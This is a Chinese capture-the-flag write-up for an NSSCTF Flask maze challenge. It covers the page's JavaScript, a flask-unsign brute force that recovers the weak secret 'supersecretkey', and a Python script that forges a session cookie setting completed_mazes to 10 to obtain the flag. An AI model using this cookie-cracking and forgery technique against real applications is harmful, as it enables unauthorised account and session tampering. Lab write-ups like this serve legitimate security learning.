# 基本信息

- 题目名称： [NSSRound#30 Duo]你也是迷宫高手吗 
- 题目链接： https://www.nssctf.cn/problem/6675
- 考点清单： 脚本编写，cookie伪造，jwt
- 工具清单： python环境，flask-unsign

## 一、看到什么

进入看到一个迷宫游戏界面，同时可以看到服务是由flask起的

![](./images/0528wp_flask.png)

## 二、想到什么解题思路

想到编写脚本过关或者前端找到过关条件

## 三、尝试过程和结果记录

在前端并未发现什么可以的可以直接通关的可用的内容，但是发现了游戏对应的操作逻辑

```javascript
<script>
    // 迷宫的二维数组，0 表示可走，1 表示墙，每次都会发生变化
    const maze = [
        ……
        [0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0],
        [0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    ];
    // 终点坐标
    const endPos = {"x": 20, "y": 20};
    // 迷宫的尺寸
    const gridSize = 21;
    // 获取迷宫容器
    const container = document.getElementById('mazeContainer');
    let resetTimeout;

    // 绘制迷宫
    function drawMaze() {
        const canvas = document.getElementById('mazeCanvas');
        const ctx = canvas.getContext('2d');
        const cellSize = canvas.width / maze.length;

        ctx.clearRect(0, 0, canvas.width, canvas.height);

        maze.forEach((row, y) => {
            row.forEach((cell, x) => {
                ctx.fillStyle = cell ? '#2c2c2c' : '#fff'; // 1为墙，黑色；0为路，白色
                ctx.fillRect(x * cellSize, y * cellSize, cellSize, cellSize);
            });
        });

        ctx.fillStyle = '#4CAF50'; // 起点绿色
        ctx.fillRect(0, 0, cellSize, cellSize);
        ctx.fillStyle = '#f44336'; // 终点红色
        ctx.fillRect(endPos.x * cellSize, endPos.y * cellSize, cellSize, cellSize);
    }

    // 鼠标移动时更新3D视角
    function updatePerspective(e) {
        const rect = container.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;
        
        container.style.setProperty('--mouse-x', x);
        container.style.setProperty('--mouse-y', y);
        container.classList.add('active');
        container.classList.remove('idle');
        
        clearTimeout(resetTimeout);
        resetTimeout = setTimeout(() => {
            container.classList.remove('active');
            container.classList.add('idle');
        }, 3000);
    }

    // 鼠标离开时重置视角
    function resetPerspective() {
        container.classList.remove('active');
        container.classList.add('idle');
    }

    // 倒计时定时器
    function updateTimer() {
        const timerElement = document.getElementById('timer');
        let remaining = 8.449719905853271; // 初始剩余时间
        
        const timerInterval = setInterval(() => {
            remaining -= 0.1;
            if(remaining <= 0) {
                clearInterval(timerInterval);
                window.location.reload(); // 时间到刷新页面
            }
            timerElement.textContent = remaining.toFixed(1) + ' 秒';
        }, 100);
    }

    // 提交和检查路径
    function submitPath() {
        const path = document.getElementById('pathInput').value.toUpperCase();
        fetch('/check', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path: path })
        }).then(response => response.json())
          .then(data => {
              if(data.success) {
                  document.body.classList.add('success-animation');
                  setTimeout(() => window.location.reload(), 800);
              } else {
                  document.body.classList.add('shake-animation');
                  setTimeout(() => document.body.classList.remove('shake-animation'), 500);
              }
          });
    }

    // 页面加载时初始化
    window.onload = () => {
        drawMaze();
        updateTimer();
        document.getElementById('pathInput').focus();
        
        container.addEventListener('mousemove', updatePerspective);
        container.addEventListener('mouseleave', resetPerspective);
    };

    // 输入路径时只允许输入大写WASD
    document.getElementById('pathInput').addEventListener('input', function(e) {
        this.value = this.value.toUpperCase().replace(/[^WASD]/g, '');
    });
</script>
```

同时发现了有cookie设置

![](./images/0528wp_cookie.png)

直接扔入jwt.io发现有“completed_mazes”字段，猜想是完成关卡的数量，直接修改成10后改cookie但发现无效，应该是需要密钥

![](./images/0528wp_jwt1.png)

在前端和其他位置均不能找到密钥，尝试使用`flask-unsign`进行弱密钥爆破

```bash
flask-unsign --unsign --cookie 'eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDQyNTQ4NzAuNzM1OTAyOH0.Z_c3lg.x-I4_6dWX101LT1jdL42fbSzG_U'
[*] Session decodes to: {'completed_mazes': 0, 'start_time': 1744254870.7359028}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 21760 attemptsess_Token_He
'supersecretkey'
```

获得密钥`supersecretkey`，写一个脚本直接获得flag

```bash
import itertools
import flask_unsign
from flask_unsign.helpers import wordlist
import requests as r
import time
import re
import sys
import os
import time

# 目标网址
url = "http://node7.anna.nssctf.cn:29809/"

# 已知密钥
secret = "supersecretkey"

# 构造 payload
payload = {
    "completed_mazes": 10,
    "start_time": time.time()
}

# 签名生成新的 session cookie
cookie = flask_unsign.sign(payload, secret=secret)

# 设置 cookie 并访问目标页面
cookies = {"session": cookie}
resp = r.get(url, cookies=cookies)

print("响应内容：")
print(resp.text)

secret = "supersecretkey"
d_cookie = "eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDQyNTQ4NzAuNzM1OTAyOH0.Z_c3lg.x-I4_6dWX101LT1jdL42fbSzG_U"
e_cookie = (
    "{'completed_mazes': 10, 'start_time': "
    + str(time.time())
    + "}"
)

os.system('flask-unsign --sign --cookie "{}" --secret "{}"'.format(e_cookie, secret))
```

![](./images/0528wp_flag.png)

## 四、总结与反思：

1. jwt密钥设置在开发的时候注意不要偷懒，使用强密钥；

2. 做ctf题目的时候注意每次响应报文的内容